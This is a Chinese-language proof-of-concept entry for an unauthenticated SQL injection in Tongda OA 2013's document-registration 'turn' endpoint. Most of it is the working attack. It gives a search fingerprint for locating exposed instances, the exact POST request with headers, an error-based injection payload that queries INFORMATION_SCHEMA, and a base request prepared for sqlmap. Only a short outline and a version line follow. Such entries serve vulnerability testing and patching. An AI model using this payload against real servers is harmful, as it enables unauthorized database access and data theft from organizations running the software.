# 通达OAturn存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/document/index.php/recv/register/turn HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=1ef6b0ee413048f9f7b2d4b78cd00598`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 159`

**请求体 / payload**
```
_SERVER=&rid=EXP(~(SELECT*FROM(SELECT md5(1) FROM INFORMATION_SCHEMA.tables where table_schema=0x74645F6F61 LIMIT 1,1)a))

sqlmap
POST /general/document/index.php/recv/register/turn HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=1ef6b0ee413048f9f7b2d4b78cd00598
Content-Type: application/x-www-form-urlencoded
Content-Length: 159
_SERVER=&rid=1
```

**其他**
- 通达OA turn存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2013